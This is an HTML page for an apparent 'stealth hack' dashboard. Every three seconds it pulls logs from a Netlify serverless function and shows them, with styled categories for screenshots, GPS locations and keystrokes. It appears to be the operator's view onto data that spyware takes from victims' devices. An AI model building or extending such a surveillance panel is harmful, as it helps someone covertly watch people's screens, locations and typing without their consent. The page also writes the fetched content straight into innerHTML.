<!DOCTYPE html>
<html>
<head>
    <title>🔥 LIVE DASHBOARD</title>
    <meta name="viewport" content="width=device-width">
    <style>
        body { 
            margin: 0; 
            background: linear-gradient(135deg, #000, #1a0033); 
            color: #0f0; 
            font-family: 'Courier New', monospace; 
            padding: 20px; 
            min-height: 100vh;
        }
        #header { 
            text-align: center; 
            font-size: 28px; 
            margin-bottom: 30px; 
            text-shadow: 0 0 20px #0f0;
        }
        #logs { 
            background: rgba(17,17,17,0.95); 
            border: 2px solid #0f0; 
            padding: 25px; 
            border-radius: 15px; 
            height: 70vh; 
            overflow-y: auto; 
            font-size: 16px; 
            line-height: 1.6;
            box-shadow: inset 0 0 20px rgba(0,255,0,0.2);
        }
        .hack-line { 
            margin: 12px 0; 
            padding: 12px; 
            background: rgba(0,255,0,0.1); 
            border-left: 4px solid #0f0;
            border-radius: 5px;
        }
        .screenshot { border-left-color: #ff6b6b !important; }
        .gps { border-left-color: #4fc3f7 !important; }
        .keys { border-left-color: #ffaa00 !important; }
        button { 
            display: block; 
            margin: 20px auto; 
            padding: 15px 40px; 
            background: #ff4444; 
            color: white; 
            border: none; 
            border-radius: 25px; 
            font-size: 18px; 
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div id="header">🔥 STEALTH HACK DASHBOARD <span id="count">0</span></div>
    <div id="logs">🔄 Loading live hacks...</div>
    <button onclick="refreshData()">🔄 REFRESH LIVE DATA</button>

    <script>
        let hackCount = 0;
        
        async function loadData() {
            try {
                const response = await fetch('/.netlify/functions/logs');
                const logs = await response.text();
                document.getElementById('logs').innerHTML = logs;
                hackCount++;
                document.getElementById('count').textContent = hackCount;
            } catch (error) {
                document.getElementById('logs').innerHTML = 
                    '<div style="color:#ff6b6b;">❌ Functions not deployed<br>Check GitHub functions/ folder</div>';
            }
        }
        
        // Auto refresh every 3 seconds
        setInterval(loadData, 3000);
        loadData(); // Initial load
        
        function refreshData() {
            loadData();
        }
    </script>
</body>
</html>
